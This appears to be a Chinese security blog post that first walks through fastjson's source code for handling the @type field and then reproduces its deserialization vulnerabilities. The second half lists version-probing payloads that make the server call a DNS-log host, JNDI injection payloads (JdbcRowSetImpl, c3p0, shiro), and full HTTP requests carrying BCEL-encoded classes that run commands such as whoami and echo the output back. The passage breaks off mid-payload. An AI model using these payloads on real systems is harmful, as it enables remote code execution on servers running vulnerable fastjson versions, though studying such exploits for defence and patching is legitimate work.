class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">       Object obj = parse(text);</span><br><span class="line">       <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">           <span class="keyword">return</span> (JSONObject) obj;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> (JSONObject) JSON.toJSON(obj);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220215092019639.png" alt="image-20220215092019639"></p><p>第一行将json字符串转化成对象，跟进parse</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220215092058104.png" alt="image-20220215092058104"></p><p>继续跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DefaultJSONParser parser = <span class="keyword">new</span> DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">    Object value = parser.parse();</span><br><span class="line"></span><br><span class="line">    parser.handleResovleTask(value);</span><br><span class="line"></span><br><span class="line">    parser.close();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会创建一个DefaultJSONParser对象，在这个过程中有如下操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DefaultJSONParser</span><span class="params">(<span class="keyword">final</span> Object input, <span class="keyword">final</span> JSONLexer lexer, <span class="keyword">final</span> ParserConfig config)</span></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.lexer = lexer;</span><br><span class="line">    <span class="keyword">this</span>.input = input;</span><br><span class="line">    <span class="keyword">this</span>.config = config;</span><br><span class="line">    <span class="keyword">this</span>.symbolTable = config.symbolTable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ch = lexer.getCurrent();</span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">        lexer.next();</span><br><span class="line">        ((JSONLexerBase) lexer).token = JSONToken.LBRACE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        lexer.next();</span><br><span class="line">        ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        lexer.nextToken(); <span class="comment">// prime the pump</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断解析的字符串是{还是[并设置token值，创建完成DefaultJSONParser对象后进入DefaultJSONParser#parse方法</p><p><img src="/images/image-20220215092450402.png" alt="image-20220215092450402"></p><p>继续跟进，因为之前设置了token值为12，所以进入如下判断</p><p><img src="/images/image-20220215092757608.png" alt="image-20220215092757608"></p><p><img src="/images/image-20220215092854609.png" alt="image-20220215092854609"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> LBRACE:</span><br><span class="line">    JSONObject object = <span class="keyword">new</span> JSONObject(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">    <span class="keyword">return</span> parseObject(object, fieldName);</span><br></pre></td></tr></table></figure><p>在第一行会创建一个空的JSONObject，随后会通过 parseObject 方法进行解析，在解析后有如下操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    String typeName = lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        object.put(JSON.DEFAULT_TYPE_KEY, typeName);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;</span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object instance = <span class="keyword">null</span>;</span><br><span class="line">            ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">            <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                instance = ((JavaBeanDeserializer) deserializer).createInstance(<span class="keyword">this</span>, clazz);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clazz == Cloneable.class) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> HashMap();</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.util.Collections$EmptyMap&quot;</span>.equals(typeName)) &#123;</span><br><span class="line">                    instance = Collections.emptyMap();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    instance = clazz.newInstance();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;create instance error&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">this</span>.setResolveStatus(TypeNameRedirect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.context != <span class="keyword">null</span> &amp;&amp; !(fieldName <span class="keyword">instanceof</span> Integer)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.popContext();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (object.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        Object newObj = TypeUtils.cast(object, clazz, <span class="keyword">this</span>.config);</span><br><span class="line">        <span class="keyword">this</span>.parseObject(newObj);</span><br><span class="line">        <span class="keyword">return</span> newObj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line">    <span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220215093712912.png" alt="image-20220215093712912"></p><p>这里会通过scanSymbol获取到@type指定类</p><p><img src="/images/image-20220215094045043.png" alt="image-20220215094045043"></p><p>然后通过 TypeUtils.loadClass 方法加载Class</p><p><img src="/images/image-20220215095515113.png" alt="image-20220215095515113"></p><p>这里首先会从mappings里面寻找类，mappings中存放着一些Java内置类，前面一些条件不满足，所以最后用ClassLoader加载类，在这里也就是加载类Student类</p><p><img src="/images/image-20220215095925122.png" alt="image-20220215095925122"></p><p>接着创建了ObjectDeserializer类并调用了deserialze方法</p><p><img src="/images/image-20220215100113570.png" alt="image-20220215100113570"></p><p>首先跟进getDeserializer方法，这里使用了黑名单限制可以反序列化的类，黑名单里面只有Thread</p><p><img src="/images/image-20220215100256636.png" alt="image-20220215100256636"></p><p>到达deserialze方法继续往下调试，就是ASM机制生成的临时代码了，这些代码是下不了断点、也看不到，直接继续往下调试即可，最后调用了set和get里面的方法</p><p><img src="/images/image-20220215100522714.png" alt="image-20220215100522714"></p><h1 id="fastjson反序列化漏洞复现"><a href="#fastjson反序列化漏洞复现" class="headerlink" title="fastjson反序列化漏洞复现"></a>fastjson反序列化漏洞复现</h1><h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><p>用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。<br>fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。</p><p>主要是利用各个类被加入黑名单的方式进行判断</p><p>原理重点关注MiscCodec处理时会去nwe URL，然后通过后面的map#put触发计算key的hash。学习urldns链容易理解。</p><p>fastjson &gt;1.2.43</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;:&quot;x&quot;&#125;</span><br></pre></td></tr></table></figure><p>fastjson &gt;1.2.48</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure><p>fastjson &gt;1.2.68</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><ol><li><p>除了考虑Fastjson版本，还得考虑JDK版本，中间件版本，第三方依赖版本。<br>JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。（更高版本也有绕过）<br>更高版本绕过可用<a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a></p><ol><li>jndi<ol><li>JdbcRowSetImpl</li><li>C3p0#JndiRefForwardingDataSource</li><li>JndiDataSourceFactory</li></ol></li><li>bcel<ol><li>tomcat#dbcp</li><li>ibatis</li></ol></li><li>TemplatesImpl</li></ol></li></ol><h3 id="Fastjson-1-2-22-1-2-24"><a href="#Fastjson-1-2-22-1-2-24" class="headerlink" title="Fastjson 1.2.22-1.2.24"></a>Fastjson 1.2.22-1.2.24</h3><h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;badClassName&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><h4 id="c3p0-JndiRefForwardingDataSource"><a href="#c3p0-JndiRefForwardingDataSource" class="headerlink" title="c3p0#JndiRefForwardingDataSource"></a>c3p0#JndiRefForwardingDataSource</h4><p>JdbcRowSetImpl无法成功可以一试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,&quot;jndiName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;badClassName&quot;, &quot;loginTimeout&quot;:0&#125;</span><br></pre></td></tr></table></figure><h4 id="shiro-JndiObjectFactory"><a href="#shiro-JndiObjectFactory" class="headerlink" title="shiro#JndiObjectFactory"></a>shiro#JndiObjectFactory</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;, &quot;resourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:9050&#x2F;exploit&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="shiro-JndiRealmFactory"><a href="#shiro-JndiRealmFactory" class="headerlink" title="shiro#JndiRealmFactory"></a>shiro#JndiRealmFactory</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:9050&#x2F;exploit&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="bcel"><a href="#bcel" class="headerlink" title="bcel"></a>bcel</h4><p>可用于解决不出网利用。 需要注意在Java 8u251以后，bcel类被删除。<br>tomcat7<br>org.apache.tomcat.dbcp.dbcp.BasicDataSource<br>tomcat8及其以后<br>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>Poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;x&quot;:&#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: &quot;x&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp</p><p>执行命令回显.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;json HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:9092</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 3327</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">        &quot;x&quot;:&#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: &quot;x&quot;</span><br><span class="line">&#125;</span><br><span class="line">POST &#x2F;json HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:9092</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">cmd: ver &amp;&amp; echo fastjson</span><br><span class="line">Content-Length: 3327</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">        &quot;x&quot;:&#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a